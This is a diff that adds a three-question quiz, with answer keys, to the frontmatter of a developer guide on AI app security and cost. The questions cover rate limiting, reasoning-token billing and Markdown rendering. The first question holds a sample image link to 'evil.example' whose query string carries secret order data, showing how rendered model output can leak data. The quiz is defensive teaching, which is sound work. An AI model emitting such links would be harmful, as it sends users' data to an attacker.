@@ -3,6 +3,41 @@ title: "Security and cost"
 description: "Prompt injection, protecting the API key, rate limiting and token cost."
 lastVerified: "2026-11-03"
 translationKey: "ai/security-and-cost"
+quiz:
+  - question: "If this Markdown from a model's output is rendered with `react-markdown` on default settings, what happens?"
+    lang: markdown
+    code: |-
+      ![x](https://evil.example/c.png?d=SECRET-ORDER-1042)
+    options:
+      - "The `href` is emptied"
+      - "The image is rendered, and when the browser requests it the data in the query goes to the attacker's server"
+      - "It is escaped as text"
+      - "The image is blocked"
+    answer: 1
+    explanation: "`react-markdown` is safe on scripts and `javascript:`, but leaves external images open. Turn images off with `components={{ img: () => null }}`; a CSP with `img-src 'self'` is the second layer."
+  - question: "Why is this in-memory rate limiter unreliable in production?"
+    lang: ts
+    code: |-
+      const hits = new Map<string, number[]>();
+
+      function limit(id: string, max = 3, windowMs = 1000) {
+        // sliding window: count requests within the last windowMs
+      }
+    options:
+      - "The sliding-window algorithm is wrong"
+      - "It should return `403` instead of `429`"
+      - "Some hosts run handlers in separate lambdas that cannot share data between requests; keep the counter somewhere external such as Redis"
+      - "A `Map` uses too much memory"
+    answer: 2
+    explanation: "The in-memory version only works in a single process. Limit anonymous users by IP and signed-in users by user id; put a stricter limit on expensive models."
+  - question: "With a reasoning model, which value in `usage` should you base the output cost on?"
+    options:
+      - "The character count of the text on screen"
+      - "Half of `totalTokens - inputTokens`"
+      - "`outputTokens`"
+      - "`outputTokenDetails.textTokens`"
+    answer: 2
+    explanation: "`reasoningTokens` show up separately on the output side and are billed; the bill can be larger than the text you see. In a multi-step call, `totalUsage` is the sum of all steps."
 ---
 
 In an application with an AI feature, two things burn you: an attacker steers the model, or the bill runs away. Both start in the same place. You did not limit who can put what in front of the model, or how much they can use it. This guide covers four subjects in order: prompt injection, protecting the API key, rate limiting and token cost. The examples run on the `/api/chat` route from [The AI SDK and streaming chat](/academy/ai/ai-sdk-and-streaming-chat).
